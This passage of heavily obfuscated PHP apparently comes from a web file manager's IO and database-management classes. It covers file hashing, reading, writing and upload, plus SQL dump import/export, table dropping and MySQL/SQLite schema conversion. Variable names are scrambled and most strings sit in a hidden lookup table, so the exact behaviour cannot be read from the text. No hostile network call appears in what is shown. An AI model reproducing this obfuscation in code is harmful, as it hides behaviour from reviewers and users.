($Àİº›ˆ == $ëŒƒŒàô[10] || $Àİº›ˆ == $ëŒƒŒàô[1385]) { continue; } $Íó¡˜£¿ = $×Œñæş . $Àİº›ˆ; if ($Çª‹øê€) { $Ò¬Î¬¶Ê++; if (@is_file($Íó¡˜£¿)) { $ˆÛÈÔ•Ó++; } else { $ú‰çøÏ++; } if ($Ò¬Î¬¶Ê > 10000) { break; } continue; } if ($÷ºş„õ‚) { if (@is_file($Íó¡˜£¿)) { return !0; } } else { if (@is_dir($Íó¡˜£¿ . $ëŒƒŒàô[8])) { return !0; } } } closedir($íğ‚Ğ£‘); if ($Çª‹øê€) { return array($ëŒƒŒàô[207] => $ˆÛÈÔ•Ó, $ëŒƒŒàô[208] => $ú‰çøÏ); } return !1; } public function hashSimple($’¤ä¨…) { $üÇ±öüÑ =& $_SERVER[Ó¡Ÿ§‚]; if (!$’¤ä¨…) { return md5($üÇ±öüÑ[12]); } $’¤ä¨… = $this->iconvSystem($’¤ä¨…); $ö¥ĞòÖ¶ = $this->size($’¤ä¨…); $ş…ÏÓà‘ = 200; $óã„°› = 50; if ($ö¥ĞòÖ¶ <= $ş…ÏÓà‘ * $óã„°›) { return $this->hashMd5($’¤ä¨…) . $ö¥ĞòÖ¶; } $ê°Ì”€ş = $üÇ±öüÑ[12]; $·“©œ± = intval($ö¥ĞòÖ¶ / $óã„°›); $İˆîÚãÎ = fopen($’¤ä¨…, $üÇ±öüÑ[1392]); if (!$İˆîÚãÎ) { return $ê°Ì”€ş; } for ($ßÁîıÀ² = 0; $ßÁîıÀ² < $óã„°›; $ßÁîıÀ²++) { fseek_64($İˆîÚãÎ, $·“©œ± * $ßÁîıÀ²); $ê°Ì”€ş .= fread($İˆîÚãÎ, $ş…ÏÓà‘); } fseek_64($İˆîÚãÎ, $ö¥ĞòÖ¶ - $ş…ÏÓà‘); $ê°Ì”€ş .= fread($İˆîÚãÎ, $ş…ÏÓà‘); fclose($İˆîÚãÎ); return md5($ê°Ì”€ş) . $ö¥ĞòÖ¶; } public function getContent($­Òö¢) { $­Òö¢ = $this->iconvSystem($­Òö¢); return file_get_contents($­Òö¢); } public function setContent($èëÉİáÜ, $÷Ê¦¹÷¢ = '') { $èëÉİáÜ = $this->iconvSystem($èëÉİáÜ); $¡çÒÂÒ = @file_put_contents($èëÉİáÜ, $÷Ê¦¹÷¢, LOCK_EX); clearstatcache(); @chmod($èëÉİáÜ, $this->pathAuth); return $¡çÒÂÒ === !1 ? !1 : !0; } public function fileSubstr($Êºâ”®‚, $×ˆ‘Ó— = 0, $Î’ÖÍ£· = false) { $í–æÙ½¥ =& $_SERVER[Ó¡Ÿ§‚]; $Êºâ”®‚ = $this->iconvSystem($Êºâ”®‚); if ($Î’ÖÍ£· === !1) { $Î’ÖÍ£· = $this->size($Êºâ”®‚); } if ($Î’ÖÍ£· <= 0) { return $í–æÙ½¥[12]; } $ºÛ”Ğ¤ = fopen($Êºâ”®‚, $í–æÙ½¥[1392]); if (!$ºÛ”Ğ¤) { return !1; } fseek_64($ºÛ”Ğ¤, $×ˆ‘Ó—); $á‹¡Œ¶· = fread($ºÛ”Ğ¤, $Î’ÖÍ£·); fclose($ºÛ”Ğ¤); return $á‹¡Œ¶·; } public function upload($ÃËÏå«Ó, $Ë«İ¸·â, $¤õí£å = false, $­†Î×…Ö = REPEAT_REPLACE) { if ($¤õí£å) { return $this->moveFile($Ë«İ¸·â, $ÃËÏå«Ó); } return $this->copyFile($Ë«İ¸·â, $ÃËÏå«Ó); } public function setModifyTime($ÇñíÎè, $²ÌèŸ» = '') { @touch($ÇñíÎè, intval($²ÌèŸ»)); } public function download($°ùµµ£Œ, $óÀÅ€Ê‡) { return $this->iconvSystem($°ùµµ£Œ); } } goto aá¿ºÍÊËŸ; B³È¸Ğ×§–: class DbManage { function __construct($•éïÈ¸ğ = array()) { $àÕ¥×¨· =& $_SERVER[Ó¡Ÿ§‚]; if (empty($•éïÈ¸ğ)) { $•éïÈ¸ğ = $GLOBALS[$àÕ¥×¨·[6]][$àÕ¥×¨·[21]]; } $this->database = $•éïÈ¸ğ; } public function model($Ÿ€êßõ¢ = '') { return new ModelBase($Ÿ€êßõ¢, $_SERVER[Ó¡Ÿ§‚][12], $this->database); } public function db($€»·Á¼â = false) { $•½”—öÛ =& $_SERVER[Ó¡Ÿ§‚]; $ÛĞßÏß˜ = array_change_key_case($this->database); if ($this->dbType() == $•½”—öÛ[13] || !$€»·Á¼â) { return $this->model()->db(); } $‚Ç•å–å = $ÛĞßÏß˜[$•½”—öÛ[971]]; $ÛĞßÏß˜[$•½”—öÛ[971]] = $•½”—öÛ[12]; if ($ÛĞßÏß˜[$•½”—öÛ[966]] == $•½”—öÛ[963]) { $ºµíŠ® = $ÛĞßÏß˜[$•½”—öÛ[972]]; $ÛĞßÏß˜[$•½”—öÛ[972]] = substr($ºµíŠ®, 0, strrpos($ºµíŠ®, $•½”—öÛ[1058])); } $this->database = $ÛĞßÏß˜; $İíÁúÂí = $this->model()->db(); try { $ØçğïÒª = $İíÁúÂí->execute("\163\x68\157\x77\40\x64\x61\164\141\142\x61\x73\x65\x73\x20\154\151\153\x65\40\47{$‚Ç•å–å}\x27"); } catch (Exception $ä£®Ïî€) { } if (!$ØçğïÒª) { $İíÁúÂí->execute("\143\x72\x65\x61\x74\145\40\144\x61\x74\141\142\x61\163\x65\x20\x60{$‚Ç•å–å}\x60"); } $ÛĞßÏß˜[$•½”—öÛ[971]] = $‚Ç•å–å; if ($ÛĞßÏß˜[$•½”—öÛ[966]] == $•½”—öÛ[963]) { $ÛĞßÏß˜[$•½”—öÛ[972]] .= $•½”—öÛ[1058] . $‚Ç•å–å; } $this->database = $ÛĞßÏß˜; $İíÁúÂí->execute("\165\163\145\x20\x60{$‚Ç•å–å}\x60"); return $İíÁúÂí; } public function createTable($­¡Ş­àº, &$ÅÜ±Òà¹) { $‰›Äãëß =& $_SERVER[Ó¡Ÿ§‚]; if (!IO::exist($­¡Ş­àº)) { ActionCall($‰›Äãëß[1059], !0, 0); show_json(LNG($‰›Äãëß[1060]), !1); } $¨¨ˆÔ¾¼ = $this->model()->db(); $Ô…±†ó½ = sqlSplit(IO::getContent($­¡Ş­àº)); foreach ($Ô…±†ó½ as $‹ƒÂÄ—•) { $ò²ÅÆ¯ø = stripos($‹ƒÂÄ—•, $‰›Äãëß[1061]) === 0; if ($ò²ÅÆ¯ø) { $ÅÜ±Òà¹->task[$‰›Äãëß[785]] += 1; } $¨¨ˆÔ¾¼->execute($‹ƒÂÄ—•); if ($ò²ÅÆ¯ø) { preg_match($‰›Äãëß[1062], $‹ƒÂÄ—•, $Å·ìÅ†); $ÅÜ±Òà¹->task[$‰›Äãëß[1063]] = $Å·ìÅ†[1]; $ÅÜ±Òà¹->update(1); } } } public function insertTable($ñ“•ê»”, &$ãˆ˜Æ‚—) { $ƒ÷ü¨± =& $_SERVER[Ó¡Ÿ§‚]; $î èÊ¬ = $this->model()->db(); $¥™ó¹ = $ÖÏê‰¼â ? array($ÖÏê‰¼â) : $î èÊ¬->getTables(); foreach ($ñ“•ê»” as $ù™Ÿ™İ®) { $ÖÏê‰¼â = basename($ù™Ÿ™İ®, $ƒ÷ü¨±[787]); if (!in_array($ÖÏê‰¼â, $¥™ó¹)) { continue; } $ãˆ˜Æ‚—->task[$ƒ÷ü¨±[1063]] = $ÖÏê‰¼â; if (get_filesize($ù™Ÿ™İ®) == 0) { continue; } $Ú¸Ã³«× = $this->sqlToDb($ù™Ÿ™İ®, $ãˆ˜Æ‚—); if (!$Ú¸Ã³«×) { ActionCall($ƒ÷ü¨±[1059], !0, 0); show_json(LNG($ƒ÷ü¨±[1064]) . "\133{$ÖÏê‰¼â}\x5d", !1); } } } public function sqlFromDb($ˆç®âÄ†, $¢®»ë²×, &$È— ¥‘Ò, $Àª¿Ê¶ø = '') { if ($È— ¥‘Ò) { $È— ¥‘Ò->task[$_SERVER[Ó¡Ÿ§‚][1063]] = $ˆç®âÄ†; } $óÍØüÑÔ = $this->model($ˆç®âÄ†); $ˆ×“ƒÏ† = 0; $øıõìşî = 0; $¹Øé³‘Æ = 10000; $ÎÇœƒ°… = fopen($¢®»ë²×, $_SERVER[Ó¡Ÿ§‚][1065]); $Ÿîş­ªÃ = $óÍØüÑÔ->getPk(); $û€Ã¯ì² = $óÍØüÑÔ->getDbFields(); $‡ÎŸíÆ = $_SERVER[Ó¡Ÿ§‚][12]; if ($GLOBALS[$_SERVER[Ó¡Ÿ§‚][786]] && in_array($ˆç®âÄ†, array($_SERVER[Ó¡Ÿ§‚][1066], $_SERVER[Ó¡Ÿ§‚][1067]))) { $‡ÎŸíÆ = $ˆç®âÄ†; } do { $¨İßüèˆ = array($Ÿîş­ªÃ => array($_SERVER[Ó¡Ÿ§‚][1013], $øıõìşî)); $óÚÁ•¾Á = $óÍØüÑÔ->where($¨İßüèˆ)->field($û€Ã¯ì²)->order($Ÿîş­ªÃ . $_SERVER[Ó¡Ÿ§‚][1068])->limit($¹Øé³‘Æ)->select(); $óÚÁ•¾Á = !empty($óÚÁ•¾Á) ? $óÚÁ•¾Á : array(); if (!($ø™ºìùê = count($óÚÁ•¾Á))) { break; } $Ÿœğå ” = end($óÚÁ•¾Á); $øıõìşî = $Ÿœğå ”[$Ÿîş­ªÃ]; $˜ŸüŸÖã = array(); foreach ($óÚÁ•¾Á as $«âÒÓø) { if ($‡ÎŸíÆ) { if ($ˆç®âÄ† == $_SERVER[Ó¡Ÿ§‚][1066]) { if ($«âÒÓø[$_SERVER[Ó¡Ÿ§‚][33]] == $_SERVER[Ó¡Ÿ§‚][1069]) { $Å£©¡… = json_decode($«âÒÓø[$_SERVER[Ó¡Ÿ§‚][374]], !0); if ($Å£©¡…[$_SERVER[Ó¡Ÿ§‚][32]] == $GLOBALS[$_SERVER[Ó¡Ÿ§‚][786]] && $Å£©¡…[$_SERVER[Ó¡Ÿ§‚][748]] != 1) { continue; } } } else { if ($«âÒÓø[$_SERVER[Ó¡Ÿ§‚][33]] == $_SERVER[Ó¡Ÿ§‚][1070] && $«âÒÓø[$_SERVER[Ó¡Ÿ§‚][94]] == $_SERVER[Ó¡Ÿ§‚][778]) { continue; } } } if ($Àª¿Ê¶ø) { $«âÒÓø[$_SERVER[Ó¡Ÿ§‚][84]] = "\173\x69\157\72{$Àª¿Ê¶ø}\175" . substr($«âÒÓø[$_SERVER[Ó¡Ÿ§‚][84]], strlen("\173\151\157\x3a{$«âÒÓø[$_SERVER[Ó¡Ÿ§‚][816]]}\175")); $«âÒÓø[$_SERVER[Ó¡Ÿ§‚][816]] = $Àª¿Ê¶ø; } $˜ŸüŸÖã[] = $_SERVER[Ó¡Ÿ§‚][1071] . $this->sqlEncode($«âÒÓø) . $_SERVER[Ó¡Ÿ§‚][1072]; } $ç¦ÂÙæ = "\111\116\x53\x45\122\124\40\x49\x4e\124\x4f\x20\140{$ˆç®âÄ†}\140\x20\x28\140" . implode($_SERVER[Ó¡Ÿ§‚][1073], $û€Ã¯ì²) . $_SERVER[Ó¡Ÿ§‚][1074]; fwrite($ÎÇœƒ°…, $ç¦ÂÙæ . implode($_SERVER[Ó¡Ÿ§‚][1075], $˜ŸüŸÖã) . $_SERVER[Ó¡Ÿ§‚][71] . PHP_EOL); $ˆ×“ƒÏ† += $ø™ºìùê; if ($È— ¥‘Ò) { $È— ¥‘Ò->update($ø™ºìùê); } } while ($¹Øé³‘Æ == $ø™ºìùê); fclose($ÎÇœƒ°…); return $ˆ×“ƒÏ†; } public function sqlToDb($ø¡ù–¦, &$¨‰ÖÂù±) { $šß¡öÌ¿ =& $_SERVER[Ó¡Ÿ§‚]; $¾Û‹ú³ = $this->model()->db(); $ğÒæíš = @fopen($ø¡ù–¦, $šß¡öÌ¿[1076]); if (!$ğÒæíš) { return !1; } $¨ù½ıæÛ = 0; $ñÛ­ß· = $šß¡öÌ¿[12]; $ò…‡•¥¦ = array(); $ˆÌ…µçÃ = $this->dbType(); $óÏ‡¾ê = $ˆÌ…µçÃ == $šß¡öÌ¿[13] ? 500 : 2000; $óÏîµÔ” = basename($ø¡ù–¦, $šß¡öÌ¿[787]); $ØáØ“ç = 0; $å–ä¦ˆ = 4194304 - 104858; $¼ƒ“€í = 1000000 - 104858; while (!feof($ğÒæíš)) { $€Ë›òÁë = trim(fgets($ğÒæíš)); if (!$€Ë›òÁë) { continue; } $ëÉÆòƒÏ = $this->sqlDecode($€Ë›òÁë, $ˆÌ…µçÃ, $óÏîµÔ”); if (stripos($ëÉÆòƒÏ, $šß¡öÌ¿[355]) === 0) { if (!$ñÛ­ß·) { $ñÛ­ß· = $ëÉÆòƒÏ . $šß¡öÌ¿[53]; } continue; } if ($¨‰ÖÂù±) { $¨‰ÖÂù±->task[$šß¡öÌ¿[785]] += 1; } $¨ù½ıæÛ++; $ò…‡•¥¦[] = rtrim(rtrim(trim($ëÉÆòƒÏ), $šß¡öÌ¿[50]), $šß¡öÌ¿[71]); $ŠÜŠÒÆÁ = null; $ìâÕâÏø = strlen($ëÉÆòƒÏ); $ØáØ“ç += $ìâÕâÏø; if ($ØáØ“ç >= ($óÏ‡¾ê == 500 ? $¼ƒ“€í : $å–ä¦ˆ)) { $ŠÜŠÒÆÁ = array_pop($ò…‡•¥¦); if ($¨ù½ıæÛ > 1) { $¨ù½ıæÛ--; } } if ($¨ù½ıæÛ >= $óÏ‡¾ê || $ŠÜŠÒÆÁ) { $ëÉÆòƒÏ = $ñÛ­ß· . implode($šß¡öÌ¿[50], $ò…‡•¥¦); if (!$¾Û‹ú³->execute($ëÉÆòƒÏ)) { return !1; } if ($¨‰ÖÂù±) { $¨‰ÖÂù±->update($¨ù½ıæÛ); } $ò…‡•¥¦ = array(); $¨ù½ıæÛ = 0; $ØáØ“ç = 0; if ($ŠÜŠÒÆÁ) { $ò…‡•¥¦ = array($ŠÜŠÒÆÁ); $¨ù½ıæÛ = 1; $ØáØ“ç = $ìâÕâÏø; } } } fclose($ğÒæíš); if (!empty($ò…‡•¥¦)) { $ëÉÆòƒÏ = $ñÛ­ß· . implode($šß¡öÌ¿[50], $ò…‡•¥¦); if (!$¾Û‹ú³->execute($ëÉÆòƒÏ)) { return !1; } if ($¨‰ÖÂù±) { $¨‰ÖÂù±->update($¨ù½ıæÛ); } } return !0; } public function dropTable($§£íÇéÎ = null) { $£Ã‡– = $this->model()->db(); $Â™¡«Ã¸ = $§£íÇéÎ ? array($§£íÇéÎ) : $£Ã‡–->getTables(); if (!$Â™¡«Ã¸) { return; } foreach ($Â™¡«Ã¸ as $§£íÇéÎ) { if ($§£íÇéÎ) { $§£íÇéÎ = strtolower($§£íÇéÎ); } else { continue; } $£Ã‡–->execute("\144\x72\x6f\x70\40\164\141\142\x6c\145\x20\151\146\x20\x65\170\x69\x73\x74\163\40\140{$§£íÇéÎ}\140"); } } private function sqlEncode($é“ò«ƒ) { $ùâ ¢€î =& $_SERVER[Ó¡Ÿ§‚]; $í‡Ûíó = array(); foreach ($é“ò«ƒ as $ˆÈ¾©±µ) { if (is_array($ˆÈ¾©±µ)) { $ˆÈ¾©±µ = json_encode_force($ˆÈ¾©±µ); } $ˆÈ¾©±µ = addslashes($ˆÈ¾©±µ); $ˆÈ¾©±µ = str_replace(array($ùâ ¢€î[1077], $ùâ ¢€î[231]), array($ùâ ¢€î[1078], $ùâ ¢€î[1079]), $ˆÈ¾©±µ); $í‡Ûíó[] = str_replace($ùâ ¢€î[58], $ùâ ¢€î[1080], $ˆÈ¾©±µ); } return $ùâ ¢€î[58] . implode($ùâ ¢€î[1081], $í‡Ûíó) . $ùâ ¢€î[58]; } private function sqlDecode($œ“õšËË, $ì«›€Ç±, $‡‚Ì©‚Í = '') { $–ºßŸ¯¹ =& $_SERVER[Ó¡Ÿ§‚]; $œ“õšËË = str_replace(array($–ºßŸ¯¹[1078], $–ºßŸ¯¹[1079]), array($–ºßŸ¯¹[1077], $–ºßŸ¯¹[231]), $œ“õšËË); if ($ì«›€Ç± == $–ºßŸ¯¹[13]) { return $‡‚Ì©‚Í != $–ºßŸ¯¹[1082] ? stripslashes($œ“õšËË) : $œ“õšËË; } if ($‡‚Ì©‚Í == $–ºßŸ¯¹[1082]) { $œ“õšËË = str_replace($–ºßŸ¯¹[1083], $–ºßŸ¯¹[118], stripslashes($œ“õšËË)); } return $œ“õšËË; } public function getSqlFile($¹Ë¹¶¡• = '') { $ÜÅ•Ñï¡ =& $_SERVER[Ó¡Ÿ§‚]; $°‰¦øô· = $this->dbType(!0); $ÇÓ•ÌË = CONTROLLER_DIR . "\151\156\x73\x74\141\x6c\154\57\144\141\164\141\57{$°‰¦øô·}\x2e\x73\161\154"; $á©“´ÃÁ = file_get_contents($ÇÓ•ÌË); $Î»‰Êí = $ÜÅ•Ñï¡[1084] . ($°‰¦øô· == $ÜÅ•Ñï¡[803] ? $ÜÅ•Ñï¡[1085] : $ÜÅ•Ñï¡[1086]) . $ÜÅ•Ñï¡[1087]; preg_match_all($Î»‰Êí, $á©“´ÃÁ, $èô· ©ã); $ûà°ÀÇŞ = $èô· ©ã[1]; $ï­­äÖ = $this->model()->db(); $¢¹ıÒ = $ï­­äÖ->getTables(); $ö‚ÊâÉ = TEMP_FILES . $ÜÅ•Ñï¡[1088] . date($ÜÅ•Ñï¡[749]) . $ÜÅ•Ñï¡[8]; del_dir($ö‚ÊâÉ); mk_dir($ö‚ÊâÉ); $­š¿åâÁ = $ö‚ÊâÉ . $ÜÅ•Ñï¡[1089]; $·ÑÂŸ¨ = $ö‚ÊâÉ . $ÜÅ•Ñï¡[1090]; $’Ê®Øƒ = $°‰¦øô· == $ÜÅ•Ñï¡[13] ? $ÜÅ•Ñï¡[803] : $ÜÅ•Ñï¡[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\x74\x61\x6c\x6c\57\144\141\x74\x61\57{$’Ê®Øƒ}\x2e\163\x71\154", $ö‚ÊâÉ); @touch($ö‚ÊâÉ . $°‰¦øô· . $ÜÅ•Ñï¡[787]); $˜ÔÈì‰ = fopen($­š¿åâÁ, $ÜÅ•Ñï¡[1065]); $ÃæÑ€™¶ = fopen($·ÑÂŸ¨, $ÜÅ•Ñï¡[1065]); if ($°‰¦øô· == $ÜÅ•Ñï¡[13]) { $¢¹ıÒ = array_diff($¢¹ıÒ, array($ÜÅ•Ñï¡[783], $ÜÅ•Ñï¡[784])); $Ò†’Ë² = array($ÜÅ•Ñï¡[1091], $ÜÅ•Ñï¡[1092], $ÜÅ•Ñï¡[1093]); fwrite($ÃæÑ€™¶, implode(PHP_EOL, $Ò†’Ë²) . PHP_EOL . PHP_EOL); foreach ($¢¹ıÒ as $ŠÓşØÚ») { $€ÚÇ¸±¬ = $this->sqlFromSqlite($ŠÓşØÚ»); if (!$€ÚÇ¸±¬[$ÜÅ•Ñï¡[13]]) { continue; } fwrite($ÃæÑ€™¶, $€ÚÇ¸±¬[$ÜÅ•Ñï¡[13]] . PHP_EOL . PHP_EOL); if (!in_array($ŠÓşØÚ», $ûà°ÀÇŞ)) { fwrite($˜ÔÈì‰, $€ÚÇ¸±¬[$ÜÅ•Ñï¡[803]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¢¹ıÒ as $ŠÓşØÚ») { $€ÚÇ¸±¬ = $this->sqlFromMysql($ŠÓşØÚ»); if (!$€ÚÇ¸±¬[$ÜÅ•Ñï¡[803]]) { continue; } fwrite($˜ÔÈì‰, $€ÚÇ¸±¬[$ÜÅ•Ñï¡[803]] . PHP_EOL . PHP_EOL); if (!in_array($ŠÓşØÚ», $ûà°ÀÇŞ)) { fwrite($ÃæÑ€™¶, $€ÚÇ¸±¬[$ÜÅ•Ñï¡[13]] . PHP_EOL . PHP_EOL); } } } fclose($˜ÔÈì‰); fclose($ÃæÑ€™¶); $á©“´ÃÁ = array($ÜÅ•Ñï¡[803] => $­š¿åâÁ, $ÜÅ•Ñï¡[13] => $·ÑÂŸ¨); return $¹Ë¹¶¡• ? $á©“´ÃÁ[$¹Ë¹¶¡•] : $á©“´ÃÁ; } public function dbType($¥°ÑÎ“ = false) { $ÀĞ”Ì°­ =& $_SERVER[Ó¡Ÿ§‚]; $à¿ ô°ã = $¥°ÑÎ“ ? $GLOBALS[$ÀĞ”Ì°­[6]][$ÀĞ”Ì°­[21]] : $this->database; $à¿ ô°ã = array_change_key_case($à¿ ô°ã); $¢ß£Ú = $à¿ ô°ã[$ÀĞ”Ì°­[966]]; if ($¢ß£Ú == $ÀĞ”Ì°­[963]) { $ºı˜¶£ = explode($ÀĞ”Ì°­[4], $à¿ ô°ã[$ÀĞ”Ì°­[972]]); $¢ß£Ú = $ºı˜¶£[0]; } $İÆÆšíŸ = array($ÀĞ”Ì°­[1094] => $ÀĞ”Ì°­[13], $ÀĞ”Ì°­[911] => $ÀĞ”Ì°­[803]); if (isset($İÆÆšíŸ[$¢ß£Ú])) { $¢ß£Ú = $İÆÆšíŸ[$¢ß£Ú]; } return $¢ß£Ú; } public function sqlFromMysql($°ÔŠ®ç©, $Œî—ë§À = '') { $¹ÂçãŸ =& $_SERVER[Ó¡Ÿ§‚]; $Å»‡Â…† = $this->model()->db(); $Áº©ıÇ = $Å»‡Â…†->query($¹ÂçãŸ[1095] . $°ÔŠ®ç© . $¹ÂçãŸ[385]); if (!$Áº©ıÇ || !$Áº©ıÇ[0]) { return !1; } $°¿—ùĞÅ = _get($Áº©ıÇ[0], $¹ÂçãŸ[1096], $¹ÂçãŸ[12]); if (!$°¿—ùĞÅ) { return !1; } $É‰»¹€‡ = "\104\x52\117\120\x20\124\x41\102\114\x45\x20\x49\x46\40\105\x58\x49\x53\x54\x53\x20\x60{$°ÔŠ®ç©}\140\x3b" . PHP_EOL . $°¿—ùĞÅ . $¹ÂçãŸ[71]; if ($Œî—ë§À && $Œî—ë§À == $¹ÂçãŸ[803]) { return $É‰»¹€‡; } $´„Ù‚‰Ø = array_change_key_case($GLOBALS[$¹ÂçãŸ[6]][$¹ÂçãŸ[21]]); $òÒşèñá = $´„Ù‚‰Ø[$¹ÂçãŸ[971]]; $‰ÈŠ½¬ = $¹ÂçãŸ[1097] . $òÒşèñá . $¹ÂçãŸ[1098] . $°ÔŠ®ç© . $¹ÂçãŸ[58]; $«Úç‚Ö = $¹ÂçãŸ[1099] . $°ÔŠ®ç© . $¹ÂçãŸ[899]; $¥„ğ‹Âû = $Å»‡Â…†->query($‰ÈŠ½¬); if (empty($¥„ğ‹Âû)) { $•¦°Ê™ = array($¹ÂçãŸ[803] => $¹ÂçãŸ[12], $¹ÂçãŸ[13] => $¹ÂçãŸ[12]); return $Œî—ë§À ? $•¦°Ê™[$Œî—ë§À] : $•¦°Ê™; } $öŠï»ä¯ = $Å»‡Â…†->query($«Úç‚Ö); $æóäª«Ö = $¹ÂçãŸ[12]; $‡Õ‡²«ˆ = array(); foreach ($öŠï»ä¯ as $Ò‹²ÂÕñ) { if (!$æóäª«Ö && $Ò‹²ÂÕñ[$¹ÂçãŸ[1100]] == $¹ÂçãŸ[1101]) { $æóäª«Ö = $Ò‹²ÂÕñ[$¹ÂçãŸ[1102]]; } if (isset($‡Õ‡²«ˆ[$Ò‹²ÂÕñ[$¹ÂçãŸ[1100]]])) { $‡Õ‡²«ˆ[$Ò‹²ÂÕñ[$¹ÂçãŸ[1100]]][$¹ÂçãŸ[1103]][] = $Ò‹²ÂÕñ[$¹ÂçãŸ[1102]]; continue; } $‡Õ‡²«ˆ[$Ò‹²ÂÕñ[$¹ÂçãŸ[1100]]] = array($¹ÂçãŸ[1104] => $Ò‹²ÂÕñ[$¹ÂçãŸ[1100]], $¹ÂçãŸ[1103] => array($Ò‹²ÂÕñ[$¹ÂçãŸ[1102]]), $¹ÂçãŸ[1105] => $Ò‹²ÂÕñ[$¹ÂçãŸ[1106]] == $¹ÂçãŸ[88] ? 0 : 1); } $„ş«æŠ = array(); foreach ($‡Õ‡²«ˆ as $Ò‹²ÂÕñ) { $˜ôóø¥Ï = $Ò‹²ÂÕñ[$¹ÂçãŸ[1104]] == $¹ÂçãŸ[1101]; $ùóíßĞè = array($¹ÂçãŸ[1107], $Ò‹²ÂÕñ[$¹ÂçãŸ[1105]] == $¹ÂçãŸ[88] && !$˜ôóø¥Ï ? $¹ÂçãŸ[1108] : $¹ÂçãŸ[12], $¹ÂçãŸ[1109], $¹ÂçãŸ[1110] . $°ÔŠ®ç© . $¹ÂçãŸ[11] . ($˜ôóø¥Ï ? $¹ÂçãŸ[1111] : $Ò‹²ÂÕñ[$¹ÂçãŸ[1104]]) . $¹ÂçãŸ[118], $¹ÂçãŸ[1112], $¹ÂçãŸ[118] . $°ÔŠ®ç© . $¹ÂçãŸ[118], $¹ÂçãŸ[1113] . implode($¹ÂçãŸ[1114], $Ò‹²ÂÕñ[$¹ÂçãŸ[1103]]) . $¹ÂçãŸ[1115]); $„ş«æŠ[] = implode($¹ÂçãŸ[53], $ùóíßĞè) . $¹ÂçãŸ[71]; } $Šô„®½˜ = array(); $–Êâç½ì = array($¹ÂçãŸ[1116] => $¹ÂçãŸ[1117], $¹ÂçãŸ[1117] => $¹ÂçãŸ[1117], $¹ÂçãŸ[288] => $¹ÂçãŸ[315], $¹ÂçãŸ[287] => $¹ÂçãŸ[315]); foreach ($¥„ğ‹Âû as $Ò‹²ÂÕñ) { $ùóíßĞè = array($¹ÂçãŸ[118] . $Ò‹²ÂÕñ[$¹ÂçãŸ[1118]] . $¹ÂçãŸ[118], isset($–Êâç½ì[$Ò‹²ÂÕñ[$¹ÂçãŸ[1119]]]) ? $–Êâç½ì[$Ò‹²ÂÕñ[$¹ÂçãŸ[1119]]] : $Ò‹²ÂÕñ[$¹ÂçãŸ[1120]], $Ò‹²ÂÕñ[$¹ÂçãŸ[1121]] == $¹ÂçãŸ[897] ? $¹ÂçãŸ[1122] : $¹ÂçãŸ[1123], $Ò‹²ÂÕñ[$¹ÂçãŸ[1118]] == $æóäª«Ö ? $¹ÂçãŸ[1124] : $¹ÂçãŸ[12], $Ò‹²ÂÕñ[$¹ÂçãŸ[948]] ? strtoupper(str_replace($¹ÂçãŸ[11], $¹ÂçãŸ[12], $Ò‹²ÂÕñ[$¹ÂçãŸ[948]])) : $¹ÂçãŸ[12]); $Šô„®½˜[] = trim(implode($¹ÂçãŸ[53], $ùóíßĞè)); } $ğÙ…á¥ = array($¹ÂçãŸ[1125] . $°ÔŠ®ç© . $¹ÂçãŸ[1126], $¹ÂçãŸ[1127] . $°ÔŠ®ç© . $¹ÂçãŸ[1128], implode($¹ÂçãŸ[50] . PHP_EOL, $Šô„®½˜), $¹ÂçãŸ[945]); $ô–äÕÆ = implode(PHP_EOL, array_merge($ğÙ…á¥, $„ş«æŠ)); if ($Œî—ë§À && $Œî—ë§À == $¹ÂçãŸ[13]) { return $ô–äÕÆ; } $•¦°Ê™ = array($¹ÂçãŸ[803] => $É‰»¹€‡, $¹ÂçãŸ[13] => $ô–äÕÆ); return $Œî—ë§À ? $•¦°Ê™[$Œî—ë§À] : $•¦°Ê™; } public function sqlFromSqlite($æÆÊÉ”¢, $ˆ³ã’Ç = '') { $™üŠ„Õâ =& $_SERVER[Ó¡Ÿ§‚]; $˜ÀßÂÂ  = $this->model()->db(); $ˆÏ˜ïô = "\120\122\101\x47\115\101\x20\x54\x41\x42\x4c\x45\x5f\111\x4e\x46\117\40\x28\x27{$æÆÊÉ”¢}\x27\51"; $“Ğç±¾¸ = "\x53\105\x4c\x45\103\124\x20\x2a\x20\106\122\117\x4d\x20\x73\x71\154\151\x74\x65\x5f\x6d\141\163\x74\145\x72\x20\x57\110\105\x52\105\40\x74\x62\x6c\x5f\156\141\x6d\145\x20\x3d\40\x27{$æÆÊÉ”¢}\47"; $ÖÎâÔ®• = $˜ÀßÂÂ ->query($ˆÏ˜ïô); if (empty($ÖÎâÔ®•)) { $àŸ—Ñˆå = array($™üŠ„Õâ[803] => $™üŠ„Õâ[12], $™üŠ„Õâ[13] => $™üŠ„Õâ[12]); return $ˆ³ã’Ç ? $àŸ—Ñˆå[$ˆ³ã’Ç] : $àŸ—Ñˆå; } $üáû·úû = $˜ÀßÂÂ ->query($“Ğç±¾¸); $Ñ“€ª›· = $±åßˆëÛ = array(); foreach ($üáû·úû as $ÅÑçåŒŠ) { if ($ÅÑçåŒŠ[$™üŠ„Õâ[33]] == $™üŠ„Õâ[279]) { $Ñ“€ª›·[] = $ÅÑçåŒŠ[$™üŠ„Õâ[1129]]; } else { $±åßˆëÛ[$ÅÑçåŒŠ[$™üŠ„Õâ[32]]] = $ÅÑçåŒŠ[$™üŠ„Õâ[1129]]; } } $û¢äØ† = array_merge(array($™üŠ„Õâ[1125] . $æÆÊÉ”¢ . $™üŠ„Õâ[118]), $Ñ“€ª›·, array_values($±åßˆëÛ)); $û¢äØ† = implode($™üŠ„Õâ[71] . PHP_EOL, $û¢äØ†) . $™üŠ„Õâ[71]; if ($ˆ³ã’Ç && $ˆ³ã’Ç == $™üŠ„Õâ[13]) { return $û¢äØ†; } $Ğè°ıè¶ = array(); $Ÿ¥Ù»ó› = array($™üŠ„Õâ[1117] => $™üŠ„Õâ[1130], $™üŠ„Õâ[315] => $™üŠ„Õâ[1131]); $ƒ“„Ó‰ø = $™üŠ„Õâ[12]; foreach ($ÖÎâÔ®• as $ÅÑçåŒŠ) { if ($ÅÑçåŒŠ[$™üŠ„Õâ[57]] == $™üŠ„Õâ[88]) { $ƒ“„Ó‰ø = $ÅÑçåŒŠ[$™üŠ„Õâ[32]]; } $Ä‡Ÿ¹È = array($™üŠ„Õâ[385] . $ÅÑçåŒŠ[$™üŠ„Õâ[32]] . $™üŠ„Õâ[385], isset($Ÿ¥Ù»ó›[$ÅÑçåŒŠ[$™üŠ„Õâ[33]]]) 